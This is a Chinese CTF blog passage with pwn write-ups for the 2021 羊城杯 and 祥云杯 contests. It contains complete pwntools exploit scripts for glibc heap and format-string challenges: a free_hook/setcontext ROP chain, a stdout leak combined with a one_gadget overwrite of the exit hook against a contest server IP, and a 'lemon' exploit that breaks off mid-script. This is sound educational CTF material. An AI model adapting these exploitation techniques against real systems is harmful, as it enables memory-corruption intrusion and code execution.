<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x140</span>))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#6</span><br></code></pre></td></tr></table></figure>

<p>到现在，所有的铺垫都已经准备好了，接着先计算一下我们需要的gadget，以及rop的地址计算，以及flag地址的排布</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924200749914.png"><span class="image-caption">image-20210924200749914</span></p>
<p>把flag字符串写到前面我们申请的1堆块上，可以直接用搜索功能，更快点，rop的地址要后面申请出写的堆块再回来算的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>] + <span class="hljs-number">53</span><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>ret = <span class="hljs-number">0x0000000000000937</span> + libc_base<br>pop_rdi = <span class="hljs-number">0x0000000000021112</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x00000000000202f8</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base<br>rop_addr = heap_addr + <span class="hljs-number">0x820</span><br>flag_addr = heap_addr - <span class="hljs-number">0x190</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924202223468.png"><span class="image-caption">image-20210924202223468</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924211125389.png"><span class="image-caption">image-20210924211125389</span></p>
<p>借着前面的堆块重叠，往free_hook里面写setcontext+53就行，然后就是最后的堆上布置rop链，堆块给的够大，那就直接选择最大的堆块进行布置，因为要先申请一个0x20的堆块，剩下的大小不够0x100，所以堆块的位置是在最下方的，然后在上面布置好rop，最后就是在setcontext的gadget指向的相应位置写好，跳转执行就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(free_hook))<br>edit(<span class="hljs-number">6</span>, p64(setcontext))<br>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#7</span><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(write)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + payload)<br>frame = SigreturnFrame()<br>frame.rsp = rop_addr + <span class="hljs-number">8</span><br>frame.rip = ret<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(frame)))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924220626687.png"><span class="image-caption">image-20210924220626687</span></p>
<p>成功读取flag！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./name&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;name size:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;name:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xe8</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&#x27;heap_addr==&gt;0x%x&#x27;</span> %heap_addr)<br><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x140</span>))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#6</span><br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>] + <span class="hljs-number">53</span><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>ret = <span class="hljs-number">0x0000000000000937</span> + libc_base<br>pop_rdi = <span class="hljs-number">0x0000000000021112</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x00000000000202f8</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base<br>rop_addr = heap_addr + <span class="hljs-number">0x820</span><br>flag_addr = heap_addr - <span class="hljs-number">0x190</span><br><br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(free_hook))<br>edit(<span class="hljs-number">6</span>, p64(setcontext))<br>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#7</span><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(write)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + payload)<br>frame = SigreturnFrame()<br>frame.rsp = rop_addr + <span class="hljs-number">8</span><br>frame.rip = ret<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(frame)))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>羊城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2021祥云杯PWN</title>
    <url>/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/</url>
    <content><![CDATA[<p>以下是我根据大佬的wp一点点复现的，比赛时，太菜了，都没做出来。下面两个链接是大佬的wp</p>
<p><a href="https://zhuanlan.zhihu.com/p/402722060">https://zhuanlan.zhihu.com/p/402722060</a></p>
<p><a href="https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ">https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ</a></p>
<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160536437.png"><span class="image-caption">image-20210903160536437</span></p>
<p>常规checksec一下，64位，保护全开</p>
<p>进入IDA看看，程序很简单，就不细说了。主要说下漏洞点</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160656584.png"><span class="image-caption">image-20210903160656584</span></p>
<p>在修改功能函数里面，存在scanf(buf)，存在格式化字符串漏洞，然后这边的要去计算偏移，一定要去相应版本的Ubuntu下去动态调试，我刚开始是在20.04下调试，偏移不对。然后这边调试技巧：因为程序开pie了，所以我们可以先输入start指令，会断在开头，这时候可以获取当前的pie，才能断点在相应的位置</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903161041335.png"><span class="image-caption">image-20210903161041335</span></p>
<p>可以计算出偏移是6，并且在底下就存在着残留的stdout指针，此时stdout指针的偏移是7，所以第一个buf就是<code>%7$s</code>那么可以修改stdout从而泄露libc地址</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903162610572.png"><span class="image-caption">image-20210903162610572</span></p>
<p>吐出了一大堆数据，接收即可。</p>
<p>然后去劫持exit_hook中的_dl_rtld_lock_recursive为one_gadget，当调用exit函数时可得到shell</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903171325616.png"><span class="image-caption">image-20210903171325616</span></p>
<p>而要找到这个偏移，要去_rtld_global中寻找</p>
<p>计算可得偏移为0x5F0F48</p>
<p>然后就是再次借用格式化字符串漏洞，前面说过了，格式化字符串处在第六个偏移，那么我们填满八个字节，然后把获得的rtld_lock地址跟在后面填入，就变为第七个偏移，之后就能在上面写入one_gadget，最后执行exit(0)getshell</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903174509942.png"><span class="image-caption">image-20210903174509942</span></p>
<p>成功getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./note&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>,<span class="hljs-number">28068</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">payload, args</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>, payload)<br>    p.sendlineafter(<span class="hljs-string">&#x27;?&#x27;</span>, args)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c36e0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc=&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>ogg = libc_base + <span class="hljs-number">0xf1247</span><br>rtld_lock = libc_base + <span class="hljs-number">0x5F0F48</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(rtld_lock))<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907101349756.png"><span class="image-caption">image-20210907101349756</span></p>
<p>常规checksec一下，64位，保护全开</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908150639102.png"><span class="image-caption">image-20210908150639102</span></p>
<p>进入IDA，发现漏洞在修改堆块内容的功能里，因为buf[4]的大小是我们设置的，最大可为0x400，所以能产生堆溢出（这是我看出的漏洞利用方法）。但是这边复现的是另一种利用方法，后面再提</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907172951372.png"><span class="image-caption">image-20210907172951372</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907173047903.png"><span class="image-caption">image-20210907173047903</span></p>
<p>这里有个伪随机数，但是我不知道怎么绕过，但是试了一下111111，可以绕过</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908145856031.png"><span class="image-caption">image-20210908145856031</span></p>
<p>flag被保存在栈上，同时有个栈地址被保存在.bss上</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908144332803.png"><span class="image-caption">image-20210908144332803</span></p>
<p>泄露出的地址，距离flag的地址偏移为0x40，然后这边为对齐，再加上了0x1000，弄成两字节地址</p>
<p>认真观察，所有的菜单功能里面都没有检查索引的下限，只是规定了不能大于3，所以可以通过堆结构的数组进行越界，寻找到之前保存在.bss上的栈地址，再借用修改功能对栈空间进行修改，通过部分覆盖将环境变量的一个指针改为flag的地址，之后破坏堆结构，报错即可泄露出flag</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908151510913.png"><span class="image-caption">image-20210908151510913</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908151525386.png"><span class="image-caption">image-20210908151525386</span></p>
<p>要越界到0x202060，也就是数组下标值为-260</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908163406979.png"><span class="image-caption">image-20210908163406979</span></p>
<p>还记得前面绕过随机数，可以输入的名字吗？刚好，前四个字节伪造size，单独一个字节能伪造堆的flag，所以我们就能对.bss上的栈地址写入0x2000长度的数据</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908164508706.png"><span class="image-caption">image-20210908164508706</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908165054261.png"><span class="image-caption">image-20210908165054261</span></p>
<p>目的是为了修改栈上的一个环境指针，然后我发现，wp里面并没有覆盖到我这的环境指针，还差八个字节，修改为<code>&#39;a&#39;*0x140</code>，如上图，修改成功了</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230006730.png"><span class="image-caption">image-20210909230006730</span></p>
<p>由于是本地调试，我直接不爆破了，转为手动输入，所以修改成功</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230112342.png"><span class="image-caption">image-20210909230112342</span></p>
<p>这里是伪造一个堆头，后面是要让堆块申请到这里，但是大小却不是0x450，导致报错退出，打印flag</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230229164.png"><span class="image-caption">image-20210909230229164</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230215738.png"><span class="image-caption">image-20210909230215738</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230529823.png"><span class="image-caption">image-20210909230529823</span></p>
<p>这边多提的是因为在申请堆块功能里面，如果第二个堆块申请大于0x400，将会直接free前面的，但是指针却没有清零，所以借用这个，可以造成double free，最终导致chunk dup，所以就可以修改一个字节，从而申请到我们前面布置好的伪造堆块上，但是我本地是没有打印出flag的，具体原因不知</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./lemon_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/libc-2.26.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,name,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;name your lemon:&quot;</span>)<br>	p.send(name)<br>	p.recvuntil(<span class="hljs-string">&quot;length of message for you lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Leave your message:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add2</span>(<span class="hljs-params">idx,name,size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;name your lemon:&quot;</span>)<br>	p.send(name)<br>	p.recvuntil(<span class="hljs-string">&quot;length of message for you lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon  :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;draw and color!&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>	p.sendafter(<span class="hljs-string">&quot;game with me?\n&quot;</span>,<span class="hljs-string">&quot;yes&quot;</span>)<br>	p.sendafter(<span class="hljs-string">&quot;number: \n&quot;</span>,<span class="hljs-string">&#x27;111111&#x27;</span>)<br>	p.sendafter(<span class="hljs-string">&quot;first: \n&quot;</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x2000</span>) + p8(<span class="hljs-number">1</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>	low = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">3</span>),<span class="hljs-number">16</span>)<br>	log.info(<span class="hljs-string">&quot;low==&gt;0x%x&quot;</span> %low)<br>	debug()<br>	a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;找到爆破字节&quot;</span>) <br>	flag_low = low - <span class="hljs-number">0x40</span> + a<br>	payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x140</span> + p8(flag_low &amp; <span class="hljs-number">0xff</span>) + p8((flag_low &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>) <span class="hljs-comment">##覆盖环境变量的位置</span><br>	edit(-<span class="hljs-number">260</span>,payload)<br>	<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>	free(<span class="hljs-number">0</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>	add2(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x500</span>)<br>	free(<span class="hljs-number">0</span>)<br>	payload = p64(<span class="hljs-number">0x20</span>) + 